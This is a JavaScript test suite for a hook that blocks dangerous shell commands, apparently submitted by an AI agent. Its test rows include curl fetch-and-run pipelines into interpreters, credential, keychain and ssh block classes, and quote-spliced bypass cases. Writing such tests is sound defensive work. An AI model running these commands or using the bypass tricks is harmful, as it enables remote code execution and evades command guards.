    input: join('{', '"tool_input"', ':'),
    encoding: 'utf8',
    timeout: 4500,
    killSignal: 'SIGKILL',
  });
}

describe('G-1787 §5 non-functional guarantees', () => {
  // Fails if any generated worst case is killed, errors, or reaches the one-second bound.
  it('N1: worst cases finish in the real hook within 1000 ms each', () => {
    assert.ok(LATENCY_CASES.length >= 4, `only ${LATENCY_CASES.length} latency generators`);
    const failures = [];
    for (const [label, generate] of LATENCY_CASES) {
      const result = runFirewall(generate(), { timeoutMs: 4500 });
      if (result.signal || result.decision === 'error' || result.elapsedMs >= 1000) {
        failures.push(`${label}: decision=${result.decision}, signal=${result.signal}, ms=${Math.round(result.elapsedMs)}`);
      }
    }
    assert.deepEqual(failures, [], `latency failures\n${failures.join('\n')}`);
  });

  // Fails if runChecks performs any process, filesystem-write, socket, or HTTP side effect.
  it('N2: full generated corpus has no side effects', () => {
    const corpus = [...P1_ROWS, ...P2_ROWS, ...SECTION3_BLOCK_ROWS, ...SECTION3_ALLOW_ROWS];
    assert.ok(corpus.length >= P1_ROWS.length + P2_ROWS.length + 1000,
      `only ${corpus.length} side-effect cases`);
    const calls = stubSideEffects(() => {
      for (const testCase of corpus) runChecks(testCase.command);
    });
    assert.equal(calls, 0, `observed ${calls} side-effect calls`);
  });

  // Fails today until a representative new block preserves the established JSON/exit shape.
  it('N3: blocked real-hook output preserves the contract', () => {
    const baseline = runFirewall(BLOCKED_SEEDS[0]);
    const result = runFirewall(CREDENTIAL_BLOCK_ROWS[0].command);
    assert.equal(result.decision, 'block');
    assert.equal(result.status, baseline.status);
    const parsed = JSON.parse(result.stdout);
    assert.deepEqual(Object.keys(parsed).sort(), ['decision', 'reason']);
    assert.equal(parsed.decision, 'block');
    assert.equal(typeof parsed.reason, 'string');
    assert.ok(parsed.reason.length > 0);
    assert.match(parsed.reason, /credential/i);
  });

  // Fails if an allowed real-hook invocation emits output or changes exit status.
  it('N3: allowed real-hook output preserves the contract', () => {
    const result = runFirewall(ALLOWED_SEEDS[6]);
    assert.equal(result.decision, 'allow');
    assert.equal(result.status, 0);
    assert.equal(result.stdout, '');
  });

  // Fails if malformed stdin stops failing closed in the existing shape.
  it('N3: malformed stdin keeps today\'s fail-closed behaviour', () => {
    const result = runMalformedStdin();
    assert.equal(result.signal, null);
    assert.equal(result.status, 0);
    const parsed = JSON.parse(result.stdout);
    assert.equal(parsed.decision, 'block');
    assert.equal(typeof parsed.reason, 'string');
    assert.match(parsed.reason, /parse/i);
  });

  // Fails until every functional/fail-closed class explains its block with a stable keyword.
  it('N3: representative block reasons contain class keywords', () => {
    const representatives = [
      ['credential', CREDENTIAL_BLOCK_ROWS[0].command, /credential/i],
      ['keychain', KEYCHAIN_BLOCK_ROWS[0].command, /keychain/i],
      ['interpreter', INTERPRETER_BLOCK_ROWS[0].command, /interpreter/i],
      ['delete', DELETE_BLOCK_ROWS[0].command, /delete/i],
      ['hostname', HOSTNAME_BLOCK_ROWS[0].command, /hostname/i],
      ['command-word', COMMAND_WORD_BLOCK_ROWS[0].command, /command word/i],
      ['ssh', SSH_BLOCK_ROWS[0].command, /ssh/i],
      ['unanalysable', UNTERMINATED_ROWS[0].command, /unanalysable/i],
      ['depth', nestShellC(ALLOWED_SEEDS[6], 9), /depth/i],
      ['dynamic', DYNAMIC_EVAL_ROWS[0].command, /dynamic/i],
    ];
    assert.ok(representatives.length >= 10, `only ${representatives.length} reason classes`);
    const failures = [];
    for (const [label, command, keyword] of representatives) {
      const result = runFirewall(command);
      if (result.decision !== 'block' || typeof result.reason !== 'string' || !keyword.test(result.reason)) {
        failures.push(label);
      }
    }
    assert.deepEqual(failures, [], `missing block reason keywords: ${failures.join(', ')}`);
  });

  // Fails if any §3 generator changes verdict across three identical runs.
  it('N5: §3 generated verdicts are deterministic', () => {
    const rows = [...SECTION3_BLOCK_ROWS, ...SECTION3_ALLOW_ROWS];
    assert.ok(rows.length >= 1000, `only ${rows.length} §3 determinism cases`);
    assertStable(rows, 'unstable §3 verdicts');
  });
});

describe('G-1787 review round 1 — bypasses', () => {
  // Each row executes a quote-spliced blocked seed or constructs its protected
  // target at runtime. All rows fail until the corresponding grammar path is
  // analysed or rejected fail-closed.
  it('blocks newly found shell-grammar bypass rows', () => {
    assert.ok(REVIEW_BYPASS_ROWS.length >= 13,
      `only ${REVIEW_BYPASS_ROWS.length} review bypass cases`);
    assertVerdicts(REVIEW_BYPASS_ROWS, 'review-round bypass mismatches');
  });
});

describe('G-1787 review round 1 — false positives', () => {
  // These substitutions occupy curl option values, not a hostname or URL
  // argument. They fail while checkHostnameSubstitution treats every dynamic
  // non-flag curl argument as a network destination.
  it('allows substitutions in non-host curl option values', () => {
    assert.ok(REVIEW_FALSE_POSITIVE_ROWS.length >= 2,
      `only ${REVIEW_FALSE_POSITIVE_ROWS.length} review false-positive cases`);
    assertVerdicts(REVIEW_FALSE_POSITIVE_ROWS, 'review-round false-positive mismatches');
  });
});

describe('G-1787 review round 1 — performance', () => {
  // Repeated interpreter stages make checkPipeline rescan every preceding
  // stage. This row is far below the 100k input cap but currently exceeds the
  // 200 ms review threshold by a wide margin.
  it('keeps a many-interpreter pipeline below 200 ms', () => {
    const command = join('sh|'.repeat(10000), 'sh');
    assert.equal(command.length, 30002);
    const started = process.hrtime.bigint();
    runChecks(command);
    const elapsedMs = Number(process.hrtime.bigint() - started) / 1e6;
    assert.ok(elapsedMs < 200,
      `latency:many-interpreter-stages took ${elapsedMs.toFixed(1)} ms for ${command.length} chars`);
  });
});

describe('G-1787 review round 1 — code defects', () => {
  // runChecks is exported as the unit-test/API boundary. Invalid JSON command
  // values must fail closed without throwing through that boundary.
  it('fails closed without throwing on non-string command values', () => {
    const inputs = [null, undefined, 7, {}, []];
    assert.ok(inputs.length >= 5, `only ${inputs.length} invalid-input cases`);
    const failures = [];
    for (const input of inputs) {
      try {
        const reason = runChecks(input);
        if (!reason) failures.push(`${String(input)}: allowed`);
      } catch (error) {
        failures.push(`${String(input)}: threw ${error.name}: ${error.message}`);
      }
    }
    assert.deepEqual(failures, [], `runChecks invalid-input failures\n${failures.join('\n')}`);
  });
});

// review-push run 9300e47a6695, finding F1 (Codex): curl told to write to
// stdout (-o -) was treated as file output, and only shells failed closed on an
// unknown pipe into stdin. Fails if either gap reopens.
const STDOUT_CURL_FORMS = [
  ['short-space', words(join('cu', 'rl'), '-o', '-', URL)],
  ['short-attached', words(join('cu', 'rl'), '-o-', URL)],
  ['cluster', words(join('cu', 'rl'), '-so', '-', URL)],
  ['long-space', words(join('cu', 'rl'), '--output', '-', URL)],
  ['long-equals', words(join('cu', 'rl'), '--output=-', URL)],
];
const STDIN_INTERPRETERS = ['python', 'python3', 'node', 'perl', 'ruby', 'osascript'];
const F1_BLOCK_ROWS = [
  ...STDOUT_CURL_FORMS.flatMap(([form, producer]) => STDIN_INTERPRETERS.map((consumer) =>
    row(`f1:curl-stdout:${form} × ${consumer}`, words(producer, '|', consumer), BLOCK))),
  ...STDIN_INTERPRETERS.map((consumer) =>
    row(`f1:unknown-pipe × ${consumer}`, words('cat', 'payload.txt', '|', consumer), BLOCK)),
  // No pipe here, so only producer detection of `curl -o -` can catch these.
  ...STDOUT_CURL_FORMS.flatMap(([form, producer]) => [
    row(`f1:curl-stdout-substitution:${form} × python3 -c`, words('python3', '-c', join('"$(', producer, ')"')), BLOCK),
    row(`f1:curl-stdout-substitution:${form} × node -e`, words('node', '-e', join('"$(', producer, ')"')), BLOCK),
  ]),
];
const F1_ALLOW_ROWS = [
  row('f1:twin-curl-output-file', words(join('cu', 'rl'), '-o', 'out.bin', URL), ALLOW),
  row('f1:twin-curl-output-equals-file', words(join('cu', 'rl'), '--output=out.bin', URL), ALLOW),
  row('f1:twin-interpreter-script-arg', words('cat', 'payload.txt', '|', 'python3', 'tool.py'), ALLOW),
  row('f1:twin-interpreter-module', words('cat', 'data.json', '|', 'python3', '-m', 'json.tool'), ALLOW),
];

describe('G-1787 review-push F1 — curl stdout and unknown pipes into interpreters', () => {
  it('blocks stdout-directed curl and unknown pipes feeding an interpreter stdin', () => {
    assert.ok(F1_BLOCK_ROWS.length >= 46, `only ${F1_BLOCK_ROWS.length} F1 block rows`);
    assertVerdicts(F1_BLOCK_ROWS, 'F1 block mismatches');
  });
  it('allows curl output files and interpreters given a script or module', () => {
    assert.ok(F1_ALLOW_ROWS.length >= 4, `only ${F1_ALLOW_ROWS.length} F1 allow rows`);
    assertVerdicts(F1_ALLOW_ROWS, 'F1 allow mismatches');
  });
});
